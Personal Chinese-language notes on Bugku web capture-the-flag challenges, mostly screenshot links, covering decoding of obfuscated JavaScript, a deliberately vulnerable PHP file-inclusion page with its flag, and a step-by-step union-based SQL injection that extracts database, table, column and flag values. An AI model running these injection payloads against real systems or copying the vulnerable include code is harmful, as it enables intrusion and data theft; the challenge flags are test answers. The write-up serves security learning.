**1. 头等舱**

<img src="file:///C:/Users/TYH/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img" style="zoom: 67%;" />

![img](file:///C:/Users/TYH/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

![img](file:///C:/Users/TYH/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)



------------



**2.源代码 **

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717090613179.png" alt="image-20210717090613179" style="zoom:50%;" />

![image-20210717090721664](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717090721664.png)

Var p1 =

'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';

var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';

eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));

将p1和p2的URL编码解码：

![image-20210717085835883](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717085835883.png)

![image-20210717085934389](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717085934389.png)

![image-20210717090059165](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717090059165.png)

整理一下，发现是一段js代码：

```js
function checkSubmit(){ 
        var a=document.getElementById("password"); 
        if("undefined"!=typeof a){ 
            if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) 
                return!0; 
           alert("Error");
           a.focus(); 
            return!1 
    }
 } 
document.getElementById("levelQuest").onsubmit=checkSubmit;
```

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717090528989.png" alt="image-20210717090528989" style="zoom:67%;" />

-----



**3.文件包含**

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717093323566.png" alt="image-20210717093323566" style="zoom:50%;" />

![image-20210717091537340](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717091537340.png)

![image-20210717091657099](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717091657099.png)

![image-20210717092157211](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717092157211.png)

![image-20210717092945034](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717092945034.png)

![image-20210717093458483](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717093458483.png)

```
<html>
    <title>Bugku-web</title>
    
<?php
	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:flag{aff721898690301d2fc7cc0d2ff35396}
?>
</html>
```

[参照]: https://blog.csdn.net/qq_51553814/article/details/118693425



-----



**4.好像需要密码**

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717131258573.png" alt="image-20210717131258573" style="zoom:50%;" />

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717131415109.png" alt="image-20210717131415109" style="zoom: 67%;" />

![img](https://img-blog.csdnimg.cn/2019070915032383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI3Mjc4MQ==,size_16,color_FFFFFF,t_70)

<img src="https://img-blog.csdnimg.cn/20210219141607220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUyMjU0MA==,size_16,color_FFFFFF,t_70" alt="img" style="zoom:67%;" />

![image-20210717134007956](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717134007956.png)

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717131336266.png" alt="image-20210717131336266" style="zoom:67%;" />

-----



**5.备份是个好习惯**

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717132315035.png" alt="image-20210717132315035" style="zoom:50%;" />

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717132208199.png" alt="image-20210717132208199" style="zoom: 67%;" />

![image-20210717132701968](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717132701968.png)

[参照]: https://www.cnblogs.com/jingvf/p/13829088.html
[参照]: https://zhuanlan.zhihu.com/p/134777329



-----



**6.学生成绩查询**

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717140533061.png" alt="image-20210717140533061" style="zoom:50%;" />

![image-20210717140456166](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717140456166.png)

id=1时，可以查询到成绩 id=1’ 为空
id=1’ and 1=1 # 与 id=1’ and 1=2 #
结果不同，由此判读可能存在sql注入

1、尝试获取列数
id=1’ order by 4 #，正常回显， id=1’ order by 5 #，异常，由此判断有4列

2、union联合查询
id=-1’ union select 1,2,3,4#，正常显示，说明存在这四列数据

3、爆库名、用户和版本
id=-1’ union select 1234,database(),user(),version() #
![img](https://img-blog.csdnimg.cn/20210220212039951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUyMjU0MA==,size_16,color_FFFFFF,t_70)
数据库为skctf

4、爆表名
id=-1' union select 1234,(select group_concat(table_name)
from information_schema.tables where table_schema=database()),user(),version()#
![img](https://img-blog.csdnimg.cn/20210220212205866.png)
表名：fl4g，sc

5、爆字段
id=-1’ union select 1234, (select
group_concat(column_name) from information_schema.columns where table_name=‘fl4g’),user(),version() #
![img](https://img-blog.csdnimg.cn/20210220212310666.png)
字段名：skctf_flag

6、爆数据
id=-1’ union select 1234, (select skctf_flag from fl4g),user(),version()#

得到flag

![image-20210717140915511](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210717140915511.png)

[参照]: https://blog.csdn.net/weixin_44522540/article/details/113975440
[参照]: https://www.cnblogs.com/jingvf/p/13841652.html
[参照]: https://blog.csdn.net/weixin_44522540/article/details/113975440
[参照]: http://t.zoukankan.com/Kuller-Yan-p-12914120.html



------



**7.网站被黑**

![image-20210718170448976](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210718170448976.png)

[参照]: https://www.cnblogs.com/0x200/p/13738660.html
[参照]: https://blog.csdn.net/qq_26090065/article/details/81571326?utm_term=bugkuweb%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-81571326&amp;spm=3001.4430



-----



**8.社工-伪造**

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210718183142794.png" alt="image-20210718183142794" style="zoom:50%;" />

<img src="https://img-blog.csdnimg.cn/20210616133444957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIyNTk3OTU1,size_16,color_FFFFFF,t_70" alt="img" style="zoom:50%;" />

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210718180102651.png" alt="image-20210718180102651" style="zoom:50%;" />

![image-20210718181242244](C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210718181242244.png)

<img src="C:\Users\TYH\AppData\Roaming\Typora\typora-user-images\image-20210718183218738.png" alt="image-20210718183218738" style="zoom:67%;" />
